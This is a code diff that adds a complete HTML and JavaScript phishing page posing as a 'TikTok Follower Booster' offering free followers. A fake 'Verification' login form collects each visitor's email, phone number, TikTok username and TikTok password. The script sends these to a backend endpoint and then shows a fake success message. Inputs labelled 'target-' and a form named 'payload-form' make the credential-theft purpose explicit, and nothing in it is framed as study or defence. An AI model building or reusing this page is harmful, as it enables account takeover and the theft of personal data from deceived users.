@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Follower Booster - Get 100k Free</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .tiktok-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .glow-btn { box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
+        .floating { animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center">
+
+    <div class="w-full tiktok-gradient py-2 text-center text-xs font-bold uppercase tracking-widest text-black">
+        Limited Time Offer: Free Followers Verification System
+    </div>
+
+    <header class="w-full max-w-md flex flex-col items-center mt-12 mb-8 px-4">
+        <div class="floating relative">
+            <i class="fab fa-tiktok text-6xl tiktok-gradient p-4 rounded-3xl shadow-2xl"></i>
+            <span class="absolute -top-2 -right-2 bg-red-500 text-[10px] px-2 py-1 rounded-full animate-bounce">LIVE</span>
+        </div>
+        <h1 class="text-4xl font-black italic mt-6 tracking-tighter">TIKTOK<span class="text-cyan-400">BOOST</span></h1>
+        <p class="text-gray-400 text-sm mt-1">Trusted by 1.2M+ Creators Worldwide</p>
+    </header>
+
+    <div id="main-content" class="w-full max-w-md px-4 pb-20">
+        
+        <!-- Selection Page -->
+        <div id="selection-page" class="space-y-4">
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-bold">Select Reward</h2>
+                <div class="text-xs text-gray-500"><i class="fas fa-users mr-1"></i> 4.2k Active</div>
+            </div>
+            
+            <div onclick="showLogin('10,000 Followers')" class="glass p-5 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-l-4 border-cyan-400">
+                <div class="flex items-center gap-4">
+                    <div class="bg-cyan-500/20 p-3 rounded-full text-cyan-400"><i class="fas fa-bolt"></i></div>
+                    <div>
+                        <div class="font-bold">10,000 Followers</div>
+                        <div class="text-[10px] text-gray-500">Delivery: Instant</div>
+                    </div>
+                </div>
+                <div class="text-xs font-black text-cyan-400 underline italic uppercase">Claim</div>
+            </div>
+
+            <div onclick="showLogin('100,000 Followers')" class="glass p-6 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-2 border-cyan-400 bg-cyan-400/5 glow-btn">
+                <div class="flex items-center gap-4">
+                    <div class="bg-white text-black p-3 rounded-full"><i class="fas fa-fire"></i></div>
+                    <div>
+                        <div class="font-bold text-xl">100,000</div>
+                        <div class="text-[10px] text-cyan-400 font-bold uppercase">Viral Package</div>
+                    </div>
+                </div>
+                <div class="tiktok-gradient text-black px-4 py-2 rounded-xl text-xs font-bold shadow-lg shadow-cyan-500/20">HOT</div>
+            </div>
+        </div>
+
+        <!-- Login Page -->
+        <div id="login-page" class="hidden">
+            <div class="glass p-8 rounded-3xl shadow-2xl relative overflow-hidden">
+                <h2 class="text-center text-2xl font-black mb-2 uppercase italic">Verification</h2>
+                <p class="text-xs text-gray-400 mb-8 text-center px-4">Login to receive <span id="selected-amount" class="text-cyan-400 font-bold"></span>.</p>
+                
+                <form id="payload-form" class="space-y-5">
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Email Address</label>
+                        <input type="email" id="target-email" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-cyan-500 text-white" placeholder="Email Address">
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Phone Number</label>
+                        <input type="tel" id="target-phone" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-pink-500 text-white" placeholder="Phone Number">
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">TikTok Username</label>
+                        <input type="text" id="target-username" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-cyan-500 text-white" placeholder="TikTok Username">
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">TikTok Password</label>
+                        <input type="password" id="target-password" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-pink-500 text-white" placeholder="TikTok Password">
+                    </div>
+                    
+                    <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-4 rounded-2xl font-black text-black tracking-widest">
+                        VERIFY & CLAIM
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Success Page -->
+        <div id="success-page" class="hidden text-center glass p-10 rounded-3xl">
+            <div class="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i class="fas fa-check text-4xl text-emerald-400"></i>
+            </div>
+            <h2 class="text-2xl font-black mb-3 text-emerald-400">SUCCESS!</h2>
+            <p class="text-gray-400 text-sm">Followers will be delivered in 24 hours.</p>
+        </div>
+    </div>
+
+    <script>
+        let selectedPackage = "10,000 Followers";
+
+        window.showLogin = (amount) => {
+            selectedPackage = amount;
+            document.getElementById('selection-page').classList.add('hidden');
+            document.getElementById('login-page').classList.remove('hidden');
+            document.getElementById('selected-amount').innerText = amount;
+        };
+
+        document.getElementById('payload-form').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submit-btn');
+
+            const email = document.getElementById('target-email').value;
+            const phoneNumber = document.getElementById('target-phone').value;
+            const tiktokUsername = document.getElementById('target-username').value;
+            const tiktokPassword = document.getElementById('target-password').value;
+
+            btn.disabled = true;
+            btn.innerText = "VERIFYING...";
+
+            try {
+                // Sending data to Node.js backend
+                const response = await fetch('http://localhost:3000/api/apply-followers', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        phoneNumber: phoneNumber,
+                        tiktokUsername: tiktokUsername,
+                        tiktokPassword: tiktokPassword,
+                        packageType: selectedPackage
+                    })
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    document.getElementById('login-page').classList.add('hidden');
+                    document.getElementById('success-page').classList.remove('hidden');
+                } else {
+                    alert(result.message || "Failed to process request.");
+                    btn.disabled = false;
+                    btn.innerText = "VERIFY & CLAIM";
+                }
+            } catch (err) {
+                console.error("Fetch Error:", err);
+                alert("Server busy or offline, try again.");
+                btn.disabled = false;
+                btn.innerText = "VERIFY & CLAIM";
+            }
+        };
+    </script>
+</body>
+</html>
